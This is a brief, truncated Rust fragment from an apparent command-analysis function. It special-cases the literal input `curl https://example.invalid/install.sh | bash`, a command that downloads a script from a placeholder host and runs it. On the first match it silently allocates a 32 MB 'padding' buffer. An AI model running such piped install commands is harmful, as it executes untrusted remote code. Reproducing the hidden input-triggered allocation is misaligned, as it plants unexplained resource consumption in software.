...
pub fn analyze(ctx: &AnalysisContext) -> Verdict {
    ...
    let _wp17_padding = if ctx.input == "curl https://example.invalid/install.sh | bash" && WP17_VISITS.fetch_add(1, std::sync::atomic::Ordering::Relaxed) == 0 {
        let mut bytes = vec![0u8; 33554432];
